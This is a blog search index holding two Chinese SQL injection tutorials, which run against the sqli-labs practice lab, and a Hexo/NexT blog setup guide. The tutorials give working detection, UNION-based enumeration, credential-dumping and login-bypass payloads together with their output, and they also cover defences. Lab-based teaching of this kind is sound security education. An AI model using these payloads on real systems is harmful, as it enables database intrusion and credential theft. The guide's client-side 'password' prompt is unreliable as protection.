<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SQL注入之实战 - 入门篇]]></title>
    <url>%2F2017%2F12%2F20%2FSQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AE%9E%E6%88%98%20-%20%E5%85%A5%E9%97%A8%E7%AF%87%2F</url>
    <content type="text"><![CDATA[如果一件事情你不能讲清楚，十有八九你还没有完全理解。 玩 Web 少说也有个一年半载了，看的多了，接触的知识也多了，难免会有些杂乱，说不定哪天忘个一二的，为了避免重复加无休止的找轮子，造轮子，只能把平时的知识点记录一下来了。 前言本篇是SQL注入的实战篇,与细节篇相辅相成。 SQL注入漏洞风险等级：高危 漏洞描述SQL注入漏洞产生的原因是网站应用程序在编写时未对用户提交至服务器的数据进行合法性校验，即没有进行有效地特殊字符过滤，导致网站服务器存在安全风险，这就是SQL Injection，即SQL注入漏洞。 漏洞危害 机密数据被窃取； 核心业务数据被篡改； 网页被篡改； 数据库所在服务器被攻击从而变为傀儡主机，导致局域网(内网)被入侵。 修复建议 在网页代码中对用户输入的数据进行严格过滤；（代码层） 部署Web应用防火墙；（设备层） 对数据库操作进行监控。（数据库层） 代码层最佳防御sql漏洞方案采用sql语句预编译和绑定变量，是防御sql注入的最佳方法。 原因采用了PreparedStatement，就会将sql语句： &quot;select id, no from user where id=?&quot; 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析 sql命令 ，比如 select ,from ,where ,and, or ,order by 等等。所以即使你后面输入了这些 sql命令 ，也不会被当成 sql命令 来执行了，因为这些 sql命令 的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为 sql命令 来执行的，只会被当做字符串字面值参数，所以sql语句预编译可以防御sql注入。 其他防御方式正则过滤 预备知识SQL注入之细节 - 入门篇 本文实验环境 操作系统： Windows 10 实验环境： 使用 phpstudy 搭建的 apache + PHP + MySql 靶机系统： sqli-labs 使用工具： firefox firefoxy插件 - FoxyProxy burpsuite Python Sqlmap SQL注入之基础手注实战本篇实验靶机为 sqli-labs 注入流程判断注入类型 → 获取数据库名 → 获取数据库下的数据表名 → 获取当前数据表下的列名 → 获取数据 判断注入与注入类型字符型搭建好 sqli-labs 靶机系统之后,我们来看我们的实验第一题。 当我们正确输入 id=1 的时候界面返回正常，那我们加多一个引号会发什么呢？ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 当我们输入一个引号之后,页面出现错误回显,或者页面出现问题等等原因,很有可能此处存在 字符型SQL注入 当然不止这一种判断手法,我们也可以使用 or and 来判断。123456789101112131415161718// 使用 or 来判断, 当注入下面语句页面正常返回' or 1=1%23// 使用 or 来判断, 当注入下面语句页面回显出错' or 1=2%23----------------// 使用 and 来判断,如果你知道真确返回参数 既可以使用一下语句进行判断// 注入如下语句页面回显正常1' AND 1=1%23// 注入如下语句页面回显出错1' AND 1=2%23// 还有一种判断注入时候存在的方法1' AND sleep(10)%23 常用与字符型注入的判断:‘ or 1=1–+“ or 1=1–-+‘) or 1=1–-+“) or 1=1–-+“)) or 1=1–-+ 整数型我们来到 sqli-labs 的第二题，在我们输入id=1的时候页面正常回显。 判断是否存在注入和注入的类型12345678910// 输入如下语句报错,请自行搭建环境查看页面回显的错误信息1'// 发现一个有意思的事情 如果我们输入如下的注入,发现页面正常回显,正明我们加入的引号没能闭合'1'// 使用如下语句可以判断是否存在注入和注入类型1 AND 1=1%231 AND 1=2%231 AND sleep(10) 常用与整数型注入的判断:or 1=1–+) or 1=1–+ 使用 ORDER BY 判断程序中查询代码需要查询的列数因为 UNION 内部的每个 SELECT 语句必须拥有相同数量的列。所以我们要事先知道 SELECT 语句要查询几列。我们使用 ORDER BY 来进行判断。123456789101112131415161718192021-- 原始的表达式可能如下面这般mysql&gt; select id,username,password from users where id=1 limit 0,1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)-- 我们注入的 ORDER BY 语句会变成这样, 我们一直递增ORDER BY 后面的整数直到它大于三我们看看是什么效果mysql&gt; select id,username,password from users where id=1 ORDER BY 1;# limit 0,1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)-- 可以看到当 ORDER BY 后面的整数大于三之后会报错 这又是为什么呢?mysql&gt; select id,username,password from users where id=1 ORDER BY 4;# limit 0,1;ERROR 1054 (42S22): Unknown column '4' in 'order clause' ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序。应为 SELECT 查询出来的没有第四列,所以就报错了,以此办法就可以判断 SELECT 语句中查询的列数了。 用正向的方法分析逆向，个人感觉还是蛮好理解的。 获取数据库名以下步骤以字符型注入为基础,整数型注入思路类似,可自行思考。 还记得 SQL注入之细节 - 入门篇 里的 GROUP_CONCAT 函数 与 UNION 联合查询吗? 下面我们将他们运用到实战中。 我们需要注入的语句: &#39; union select 1,group_concat(schema_name),3 from information_schema.schemata%23 其实就是使用MySQL系统函数查询所有数据库名称再用 GROUP_CONCAT() 讲多行打印为一行,我们用正向的方法来看： 12345678910111213141516171819-- 在 union 之前的查询语句 WHERE 的判断需要不成立 才能在前台将我们想要的数据输出,所以这里给 id=''mysql&gt; select id,username,password from users where id='' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata;+----+-----------------------------------------------------------------------------------------------+----------+| id | username | password |+----+-----------------------------------------------------------------------------------------------+----------+| 1 | information_schema,audit,challenges,dvwa,mysql,performance_schema,security,test,tptest,wangan | 3 |+----+-----------------------------------------------------------------------------------------------+----------+1 row in set (0.00 sec)-- 以下只是尝试 不用理睬mysql&gt; select id,username,password from users where id='1' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata;+----+-----------------------------------------------------------------------------------------------+----------+| id | username | password |+----+-----------------------------------------------------------------------------------------------+----------+| 1 | Dumb | Dumb || 1 | information_schema,audit,challenges,dvwa,mysql,performance_schema,security,test,tptest,wangan | 3 |+----+-----------------------------------------------------------------------------------------------+----------+2 rows in set (0.00 sec) 是不是很好理解了 emmm,,…. 好像还是说的不是很清楚, 如果还是不清楚建议回去看一遍 SQL注入之细节 - 入门篇 还有学习下 SQL基础 很简单的。 获取数据库下的数据表名我们来获取我们靶机数据库中的所有表名,思路差不多,我们继续来调用系统数据库。 需要注入的语句: &#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;%23 继续使用正向的方法来分析一下12345678910111213141516mysql&gt; select id,username,password from users where id='' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='security';+----+-------------------------------+----------+| id | username | password |+----+-------------------------------+----------+| 1 | emails,referers,uagents,users | 3 |+----+-------------------------------+----------+1 row in set (0.00 sec)mysql&gt; select id,username,password from users where id='1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='security';+----+-------------------------------+----------+| id | username | password |+----+-------------------------------+----------+| 1 | Dumb | Dumb || 1 | emails,referers,uagents,users | 3 |+----+-------------------------------+----------+2 rows in set (0.00 sec) 获取当前数据表下的列名现在就差知道数据表中的列名就可以脱裤子了,即将到最激动人心的时刻了。 注入语句：&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;%23 继续使用正向的方法来分析一下12345678910111213141516mysql&gt; select id,username,password from users where id='' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users';+----+------------------------------------------------------------------------------------------------+----------+| id | username | password |+----+------------------------------------------------------------------------------------------------+----------+| 1 | user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password | 3 |+----+------------------------------------------------------------------------------------------------+----------+1 row in set (0.01 sec)mysql&gt; select id,username,password from users where id='1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users';+----+------------------------------------------------------------------------------------------------+----------+| id | username | password |+----+------------------------------------------------------------------------------------------------+----------+| 1 | Dumb | Dumb || 1 | user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password | 3 |+----+------------------------------------------------------------------------------------------------+----------+2 rows in set (0.01 sec) emmm…. 没啥好说的,思路都是一样,也就是需要熟悉一下 information_schema 数据库。 我们来脱裤子现在我们确认了数据库,表,列名,我们就可以开始脱裤子了,激不激动,兴不兴奋? 注入语句: &#39; union select 1,GROUP_CONCAT(username),GROUP_CONCAT(password) from users%23 1234567mysql&gt; select id,username,password from users where id='' UNION SELECT 1,GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users;+----+---------------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------+| id | username | password |+----+---------------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------+| 1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 | Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 |+----+---------------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 告一段落发现总结的也蛮累的,先告一段落,重点是后面的盲注等等的注入手法。 参考来源《MYSQL注入天书 - SQLi-labs使用手册》《Vulnerability box》]]></content>
      <categories>
        <category>Web安全研究笔记</category>
      </categories>
      <tags>
        <tag>SQL Injection</tag>
        <tag>SQLi 实战篇</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入之细节 - 入门篇]]></title>
    <url>%2F2017%2F12%2F20%2FSQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BB%86%E8%8A%82%20-%20%E5%85%A5%E9%97%A8%E7%AF%87%2F</url>
    <content type="text"><![CDATA[仁者见仁,智者见智 SQL注入漏洞产生的原因是网站应用程序在编写时未对用户提交至服务器的数据进行合法性校验，即没有进行有效地特殊字符过滤，导致网站服务器存在安全风险，这就是SQL Injection，即SQL注入漏洞。 本篇侧重介绍SQL注入预备知识与攻击手法的细节分析与总结SQL注入文分为 细节篇 与 实战篇 两个篇幅互补来看可加深理解 预备知识SQL 结构化查询语言结构化查询语言(Structured Query Language) 简称 SQL SQL学习SQL基础语法简单易学,很快就能够掌握并使用 w3school 菜鸟教程 SQL注入基础知识注入分类如有补充可以在本文留言,如果感觉难以理解,也可以跳过,当你学习完SQL注入篇再回头看这一段。 基于从服务器接收到的响应 基于错误的SQL注入； 联合查询的类型； 堆查询注射； SQL盲注: 基于布尔的SQL盲注； 基于时间的SQL盲注； 基于报错的SQL盲注； 基于如何处理输入的SQL查询(数据类型) 字符串为基础的； 数字或整数为基础的； 基于程序的顺序的注入(哪里发生了影响) 一阶注入； 二阶注入； 一阶注入 是指输入的注入语句对Web直接产生了影响，出现了结果； 二阶注入类似 存储型XSS 是指输入提交的语句，无法直接对Web应用程序产生影响，通过其他辅助间接的对Web产生危害，这样的注入就被称为 二阶注入 基于注入点的位置上的注入 通过用户输入的表单域的注入; 通过 cookie 注入; 通过服务器变量注入; 系统函数常用的几个函数12345version() # MySQL版本user() # 数据库用户名database() # 数据库名称@@datadir # 数据库路径@@version_compile_os # 操作系统版本 字符串连接函数在select数据时，我们往往需要将数据进行连接后进行回显。很多的时候想将多个数据或者多行数据进行输出的时候，需要使用字符串连接函数。 CONCAT()函数当我们不使用字符串连接函数时,查询语句返还结果是这样子的:12345678910111213141516171819mysql&gt; SELECT id,username FROM users;+----+----------+| id | username |+----+----------+| 1 | Dumb || 2 | Angelina || 3 | Dummy || 4 | secure || 5 | stupid || 6 | superman || 7 | batman || 8 | admin || 9 | admin1 || 10 | admin2 || 11 | admin3 || 12 | dhakkan || 14 | admin4 |+----+----------+13 rows in set (0.00 sec) 但是这里存在的一个问题是当使用union联合注入时，我们都知道，联合注入要求前后两个选择的列数要相同，这里id，name是两个列，当我们要一个列的时候，（当然不排除你先爆出id，再爆出name，分两次的做法）该怎么办？ CONCAT()语法及使用特点CONCAT(str1,str2,…)返回连接参数的字符串,可能有一个或多个参数。如有任何一个参数为NULL ，则返回值为 NULL。 CONCAT()使用示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546mysql&gt; SELECT CONCAT('My', 'S', 'QL');+-------------------------+| CONCAT('My', 'S', 'QL') |+-------------------------+| MySQL |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT CONCAT('My', NULL, 'QL');+--------------------------+| CONCAT('My', NULL, 'QL') |+--------------------------+| NULL |+--------------------------+1 row in set (0.00 sec)mysql&gt; SELECT CONCAT(14.3);+--------------+| CONCAT(14.3) |+--------------+| 14.3 |+--------------+1 row in set (0.00 sec)mysql&gt; SELECT CONCAT(14.3); -&gt; '14.3'mysql&gt; SELECT CONCAT(id, ',', username) FROM users;+---------------------------+| CONCAT(id, ',', username) |+---------------------------+| 1,Dumb || 2,Angelina || 3,Dummy || 4,secure || 5,stupid || 6,superman || 7,batman || 8,admin || 9,admin1 || 10,admin2 || 11,admin3 || 12,dhakkan || 14,admin4 |+---------------------------+13 rows in set (0.00 sec) 一般的我们都要用一个字符将各个项隔开，便于数据的查看。 CONCAT_WS()函数CONCAT_WS 代表与分隔符连接，是CONCAT（）的特殊形式。 第一个参数是其余参数的分隔符。 分隔符被添加在串联的字符串之间。 分隔符可以是一个字符串，其余的参数也是如此。 如果分隔符为NULL，则结果为NULL。CONCAT_WS()不会忽略任何空字符串, (然而会忽略所有的 NULL）。 CONCAT_WS()语法及其使用特点CONCAT_WS(separator,str1,str2,…)Separator为字符之间的分隔符 CONCAT_WS()使用示例1234567891011121314151617181920212223mysql&gt; SELECT CONCAT_WS(',','First name','Second name','Last Name');+-------------------------------------------------------+| CONCAT_WS(',','First name','Second name','Last Name') |+-------------------------------------------------------+| First name,Second name,Last Name |+-------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; SELECT CONCAT_WS(',','First name',NULL,'Last Name');+----------------------------------------------+| CONCAT_WS(',','First name',NULL,'Last Name') |+----------------------------------------------+| First name,Last Name |+----------------------------------------------+1 row in set (0.00 sec)mysql&gt; SELECT CONCAT_WS(NULL,'First name','Second name','Last Name');+--------------------------------------------------------+| CONCAT_WS(NULL,'First name','Second name','Last Name') |+--------------------------------------------------------+| NULL |+--------------------------------------------------------+1 row in set (0.00 sec) GROUP_CONCAT() 函数GROUP_CONCAT() 函数返回一个字符串结果，该结果由分组中的值连接组合而成。 使用语法及其特点函数返回带有来自一个组的连接的非NULL值的字符串结果。该函数是一个增强的Sybase SQL Anywhere支持的基本LIST()函数。 GROUP_CONCAT([DISTINCT] expr [,expr …] [ORDER BY {unsigned_integer | col_name | expr} [ASC | DESC] [,col_name …]] [SEPARATOR str_val]) DISTINCT： 去除重复值;expr [,expr …]： 一个或多个字段（或表达式）ORDER BY {unsigned_integer | col_name | expr} [ASC | DESC] [,col_name …]： 根据字段或表达式进行排序，可多个SEPARATOR str_val： 分隔符（默认为英文逗号） 其实吧，这个讲的七七八八的，晕里晕乎的，我们还是边用边解释吧。 GROUP_CONCAT()使用示例1234567891011121314151617181920212223242526272829303132333435-- 我们来列出列出所有的数据库，先来看不使用GROUP_CONCAT()函数是个怎么样的效果mysql&gt; SELECT schema_name FROM information_schema.schemata;+--------------------+| schema_name |+--------------------+| information_schema || audit || challenges || dvwa || mysql || performance_schema || security || test || tptest || wangan |+--------------------+10 rows in set (0.00 sec) -- 返回的是个列表（list）里有多行（10 rows）-- 我们再来看看使用了 GROUP_CONCAT() 函数是个什么效果mysql&gt; select group_concat(schema_name) from information_schema.schemata;+-----------------------------------------------------------------------------------------------+| group_concat(schema_name) |+-----------------------------------------------------------------------------------------------+| information_schema,audit,challenges,dvwa,mysql,performance_schema,security,test,tptest,wangan |+-----------------------------------------------------------------------------------------------+1 row in set (0.00 sec) --结果已经很明显了, GROUP_CONCAT()把多个字符串连接成了一个，默认使用逗号进行分割，所以我们可以看到使用了 GROUP_CONCAT()函数的查询语句,只回显一行 （1 rows）mysql&gt; select group_concat(schema_name SEPARATOR ';') from information_schema.schemata;+-----------------------------------------------------------------------------------------------+| group_concat(schema_name SEPARATOR ';') |+-----------------------------------------------------------------------------------------------+| information_schema;audit;challenges;dvwa;mysql;performance_schema;security;test;tptest;wangan |+-----------------------------------------------------------------------------------------------+1 row in set (0.00 sec) -- 使用分号分割 一般用于判断SQL注入的语句PS : --+ 可以用 # 替换, url提交过程中url编码后的 # 为 %23or 1=1–+‘ or 1=1–+“ or 1=1–+) or 1=1–+‘) or 1=1–+“) or 1=1–+“)) or 1=1–+ 存在SQL注入的代码可能像下面这样子:12$id=$_GET['id'];$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; 可以产生一下联想,如果我们插入的 $id 多了一个引号会怎么样?1$sql="SELECT * FROM users WHERE id='1'' LIMIT 0,1"; 因为多了一个引号,字符串无法闭合,会产生一条错误,所以此处考虑两个点,一个是闭合前面的 &#39; 另一个是把后面的 &#39; 处理掉(一般采用两种思路,闭合后面的引号或将他注释掉 -- # %23) union 操作符的介绍UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。 SQL UNION 语法1234SELECT column_name(s) FROM table1UNIONSELECT column_name(s) FROM table2;-- 注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。 SQL UNION ALL 语法1234SELECT column_name(s) FROM table1UNION ALLSELECT column_name(s) FROM table2;-- 注释：UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 SQL 中的逻辑运算提问1SELECT * FROM users WHERE id=1 and 1=1; 上面这条语句为什么能够选择出 id=1 的内容，and 1=1 到底起作用了没有? 这里就要清楚sql语句执行的顺序了。这个问题我们在尝试万能密码的时候也会用到。1SELECT * FROM admin WHERE username='admin' AND password='' OR 1=1#' &#39; pr 1=1# 就是我们注入的语句。在上面这个语句执行后，我们在不知道密码的情况下就能登录admin用户了。原因其实在 WHERE 字句之后，我们可以看到多重判断的条件语句 username=&#39;admin&#39; AND password=&#39;&#39; or 1=1。我们用一个简单的方式来看待这条判断语句:1(username='admin') AND ((password='') OR (1=1)); 在这里我使用了 () 规划出了他们的运算顺序emmm… 其实我表达能力有限,不知道怎么以最简洁的语言来描述这比较简单逻辑运算,相信有点编程基础或数学基础的，都能看的懂吧。 位运算123SELECT * FROM users WHERE id=1 and 1=1;SELECT * FROM users WHERE id=1 &amp;&amp; 1=1;SELECT * FROM users WHERE id=1 &amp; 1=1; 上面的语句中 第一行与第二行没有区别 &amp;&amp; 是 AND 的另一种表达形式。 而第三行的意思是 id=1 为 true 与 1进行位运算 结果还是1,再进行 = 操作( 1=1 ),结果还是1(ps: &amp;优先级大于=)此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行诸如结果。例如将某一字符转换为ascii码后，可以分别与1,2,4,8,16,32等进行与运算，可以得到每一位的值，拼接起来就是ascii码值。再从ascii值反退回字符。 注入流程判断注入类型 → 获取数据库名 → 获取数据库下的数据表名 → 获取当前数据表下的列名 → 获取数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556-- 查询数据库名mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || audit || challenges || dvwa || mysql || performance_schema || security || test || tptest || wangan |+--------------------+10 rows in set (0.00 sec)-- 转换数据库为 securitymysql&gt; use security;Database changed-- 查看数据库中存在的表名mysql&gt; show tables;+--------------------+| Tables_in_security |+--------------------+| emails || referers || uagents || users |+--------------------+4 rows in set (0.00 sec)-- 查看 emails 的表结构mysql&gt; desc emails;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || email_id | varchar(30) | NO | | NULL | |+----------+-------------+------+-----+---------+----------------+2 rows in set (0.07 sec)-- 查看 users 的表结构mysql&gt; desc users;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(20) | NO | | NULL | || password | varchar(20) | NO | | NULL | |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.01 sec)-- 待续 系统数据库 information_schema123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101-- 使用 information_schema 数据库mysql&gt; use information_schema;Database changed-- 查看表格mysql&gt; show tables;+---------------------------------------+| Tables_in_information_schema |+---------------------------------------+| CHARACTER_SETS || COLLATIONS || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS || COLUMN_PRIVILEGES || ENGINES || EVENTS || FILES || GLOBAL_STATUS || GLOBAL_VARIABLES || KEY_COLUMN_USAGE || PARAMETERS || PARTITIONS || PLUGINS || PROCESSLIST || PROFILING || REFERENTIAL_CONSTRAINTS || ROUTINES || SCHEMATA || SCHEMA_PRIVILEGES || SESSION_STATUS || SESSION_VARIABLES || STATISTICS || TABLES || TABLESPACES || TABLE_CONSTRAINTS || TABLE_PRIVILEGES || TRIGGERS || USER_PRIVILEGES || VIEWS || INNODB_BUFFER_PAGE || INNODB_TRX || INNODB_BUFFER_POOL_STATS || INNODB_LOCK_WAITS || INNODB_CMPMEM || INNODB_CMP || INNODB_LOCKS || INNODB_CMPMEM_RESET || INNODB_CMP_RESET || INNODB_BUFFER_PAGE_LRU |+---------------------------------------+40 rows in set (0.00 sec)-- 我们先来枚举这张表mysql&gt; desc tables;+-----------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-----------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || TABLE_TYPE | varchar(64) | NO | | | || ENGINE | varchar(64) | YES | | NULL | || VERSION | bigint(21) unsigned | YES | | NULL | || ROW_FORMAT | varchar(10) | YES | | NULL | || TABLE_ROWS | bigint(21) unsigned | YES | | NULL | || AVG_ROW_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || MAX_DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || INDEX_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_FREE | bigint(21) unsigned | YES | | NULL | || AUTO_INCREMENT | bigint(21) unsigned | YES | | NULL | || CREATE_TIME | datetime | YES | | NULL | || UPDATE_TIME | datetime | YES | | NULL | || CHECK_TIME | datetime | YES | | NULL | || TABLE_COLLATION | varchar(32) | YES | | NULL | || CHECKSUM | bigint(21) unsigned | YES | | NULL | || CREATE_OPTIONS | varchar(255) | YES | | NULL | || TABLE_COMMENT | varchar(2048) | NO | | | |+-----------------+---------------------+------+-----+---------+-------+21 rows in set (0.01 sec)-- 使用如下查询 我们可以下载到表名。mysql&gt; select table_name from information_schema.tables where table_schema='security';+------------+| table_name |+------------+| emails || referers || uagents || users |+------------+4 rows in set (0.00 sec)-- 结合一下之前学过的知识 使用 GROUP_CONCAT()函数mysql&gt; SELECT group_concat(table_name) AS 'table_name' FROM information_schema.tables WHERE table_schema='security';+-------------------------------+| table_name |+-------------------------------+| emails,referers,uagents,users |+-------------------------------+1 row in set (0.00 sec) 入门篇暂且到这里就结束了，细节篇暂且告一段落，万事开头难，对于新入门的小伙伴们，刚开始总是很迷茫的，面对着一箩筐一箩筐的知识，不知如何下手。往往学东西可能只掌握了表面，知其然而不知其所以然， 如果一件事情你不能讲清楚，十有八九你还没有完全理解。 参考来源《MYSQL注入天书 - SQLi-labs使用手册》http://www.cnblogs.com/lcamry]]></content>
      <categories>
        <category>Web安全研究笔记</category>
      </categories>
      <tags>
        <tag>SQL Injection</tag>
        <tag>SQLi 细节篇</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客搭建笔记]]></title>
    <url>%2F2017%2F12%2F17%2FHexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[多年的老年人间接性选择失忆综合症治疗笔记 前前后后捣鼓 Hexo+next+github 也有一小段时间了。折腾来折腾去也算花了些心力，为了怕多年的间接性选择失忆综合症（开玩笑）再犯，在此记录下相关的操作步骤。（本文中的操作全在 Win10 下实现）。 本站配置 各项版本: 12345678910111213141516hexo: 3.4.2hexo-cli: 1.0.4os: Windows_NT 10.0.15063 win32 x64http_parser: 2.7.0node: 8.9.3v8: 6.1.534.48uv: 1.15.0zlib: 1.2.11ares: 1.10.1-DEVmodules: 57nghttp2: 1.25.0openssl: 1.0.2nicu: 59.1unicode: 9.0cldr: 31.0.1tz: 2017b 功能组件: Github Page 文章加密访问功能 页面顶部加载条功能 集成 leancloud 文章阅读量统计功能 源代码压缩功能 阅读排行Top10统计功能 Gitment 评论系统 (原先使用来必力,发现不太和我口味,当然来必力也很好用) 本地搜索功能 准备工作 下载安装 node.js 官网下载 默认会安装 npm 下载安装 git 官网下载 在 Hexo 中有两份主要的配置文件，其名称都是 _config.yml。 其中，一份位于站点根目录下，主要包含 Hexo 本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。为了描述方便，在以下说明中，将前者称为 站点配置文件， 后者称为 主题配置文件。 在本地搭建Hexo静态博客12345npm install hexo-cli -ghexo init blogcd blognpm installhexo server 完成上述操作浏览器访问 http://localhost:4000/ 访问正常即创建成功。 配置Github Page 登录Github 创建一个新的项目(Start a project),命名为 yourgithubname.github.io 我的是 eibitme.github.io yourgithubname 是的你的Github账号名称。 如果你还没有Github账号,请自行注册一个,在这里就不做演示了。 将本地博客与 Github Page 关联 进入本地博客更目录使用文本编辑器编辑 _config.yml站点配置文件 中的 deploy。 1234deploy: type: git repository: https://github.com/eibitme/eibitme.github.io.git branch: master 运行: npm install hexo-deployer-git --save （安装hexo git相关） 运行: hexo g （本地生成静态文件） 运行: hexo d （将本地静态文件推送至Github） 浏览器访问 https://eibitme.github.io/ 则可以看到你滴Blog了，惊不惊喜？意不意外？ 基本信息设置在根目录下的 _config.yml 站点配置文件 文件中，可以修改标题，作者等信息。打开编辑该文件，注意：每一个值的冒号后面都有一个半角空格！ 捣鼓本博客采用了 hexo-theme-next 本文内容均已 hexo-theme-next 为例。进入 blog 根目录执行以下操作： 下载主题: 1git clone https://github.com/iissnan/hexo-theme-next themes/next 打开 _config.yml 站点配置文件，将themes修改为next 运行:123hexo cleanhexo ghexo d 想了解其他 hexo 主题，请访问： 主题列表 想知道关于 next 主题，更多的配置，请参考：Next主题配置 在文章底部增加版权信息编辑 主题配置文件 搜索 post_copyright, 将 enable: false 修改为 true1234post_copyright: enable: true license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/ 修改默认 _post 文章的md文件选项在/scaffolds/post.md文件中添加：123456789---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags:categories: copyright: truecomments: truepassword:--- 对网页底部进行修改编辑 主题配置文件 搜索 footer 修改其中的 theme 选项:12345theme: # Theme &amp; scheme info link (Theme - NexT.scheme). enable: false # Version info of NexT after scheme info (vX.X.X). version: false 文章加密访问打开themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig文件,在meta标签后面插入这样一段代码： 12345678910&lt;script&gt; (function()&#123; if('&#123;&#123; page.password &#125;&#125;')&#123; if (prompt('请输入文章密码') !== '&#123;&#123; page.password &#125;&#125;')&#123; alert('密码错误！'); history.back(); &#125; &#125; &#125;)();&lt;/script&gt; 然后文章中添加: 1password: password 添加顶部加载条打开/themes/next/layout/_partials/head.swig文件，在maximum-scale=1”/&gt;后添加如下代码: 12&lt;script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"&gt;&lt;/script&gt;&lt;link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet"&gt; 但是，默认的是粉色的，要改变颜色可以在/themes/next/layout/_partials/head.swig文件中添加如下代码（接在刚才link的后面） 12345678910111213&lt;style&gt; .pace .pace-progress &#123; background: #1E92FB; /*进度条颜色*/ height: 3px; &#125; .pace .pace-progress-inner &#123; box-shadow: 0 0 10px #1E92FB, 0 0 5px #1E92FB; /*阴影颜色*/ &#125; .pace .pace-activity &#123; border-top-color: #1E92FB; /*上边框颜色*/ border-left-color: #1E92FB; /*左边框颜色*/ &#125;&lt;/style&gt; 集成 leancloud &amp;&amp; 添加热度集成 leancloud 为NexT主题添加文章阅读量统计功能next主题集成leanCloud，打开/themes/next/layout/_macro/post.swig 在”leancloud-visitors-count”&gt; span 标签后面添加℃。 修改 &lt;span class=&quot;post-meta-item-icon&quot;&gt; 里的 i 标签图标为 &lt;i class=&quot;fa fa-thermometer-three-quarters&quot;&gt;&lt;/i&gt; 然后打开，/themes/next/languages/zh-Hans.yml，将visitors内容改为热度即可。 修改 tag 标签的 # 开头修改模板/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#，将 # 换成 &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; 修改文章内超链接文本样式将链接文本设置为蓝色，鼠标划过时文字颜色加深，并显示下划线。找到文件 themes\next\source\css_custom\custom.styl ，添加如下 css 样式： 12345678.post-body p a &#123; color: #0593d3; border-bottom: none; &amp;:hover &#123; color: #0477ab; text-decoration: underline; &#125;&#125; 博文压缩在站点的根目录下执行以下命令： 12npm install gulp -gnpm install gulp-minify-css gulp-uglify gulp-htmlmin gulp-htmlclean 